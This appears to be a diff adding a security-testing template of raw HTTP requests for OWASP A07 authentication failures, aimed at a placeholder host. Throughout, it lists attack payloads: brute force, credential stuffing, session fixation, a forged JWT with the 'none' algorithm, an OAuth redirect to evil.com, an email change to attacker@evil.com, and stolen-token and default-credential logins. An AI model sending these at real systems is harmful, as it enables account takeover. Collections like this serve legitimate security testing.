@@ -1,0 +1,79 @@
+# OWASP Top 10 - A07:2021 Identification and Authentication Failures
+# Failles d'authentification
+
+### Brute Force - Common passwords
+POST /login HTTP/1.1
+Host: {{host}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+username=admin&password=123456
+
+### Credential Stuffing
+POST /api/auth HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 55
+
+{"username": "user@email.com", "password": "Password123"}
+
+### Session Fixation
+GET /login?PHPSESSID=attacker_controlled_session HTTP/1.1
+Host: {{host}}
+
+### Weak Session ID
+GET /dashboard HTTP/1.1
+Host: {{host}}
+Cookie: session_id=12345
+
+### Session ID in URL
+GET /dashboard?session=abc123def456 HTTP/1.1
+Host: {{host}}
+
+### Missing Multi-Factor Authentication
+POST /admin/login HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 50
+
+{"username": "admin", "password": "ValidPassword1"}
+
+### Password Reset Token Prediction
+GET /reset-password?token=123456 HTTP/1.1
+Host: {{host}}
+
+### Account Takeover via Email
+POST /api/update-email HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 45
+
+{"user_id": 999, "email": "attacker@evil.com"}
+
+### JWT None Algorithm
+GET /api/admin HTTP/1.1
+Host: {{host}}
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+
+### JWT Weak Secret
+GET /api/data HTTP/1.1
+Host: {{host}}
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+### OAuth Redirect URI Manipulation
+GET /oauth/authorize?client_id=123&redirect_uri=https://evil.com/callback HTTP/1.1
+Host: {{host}}
+
+### Remember Me Token Theft
+GET /dashboard HTTP/1.1
+Host: {{host}}
+Cookie: remember_me=stolen_token_value
+
+### Default API Keys
+GET /api/data?api_key=default_key_12345 HTTP/1.1
+Host: {{host}}
+
+### Hardcoded Credentials
+POST /api/admin HTTP/1.1
+Host: {{host}}
+Authorization: Basic YWRtaW46YWRtaW4=
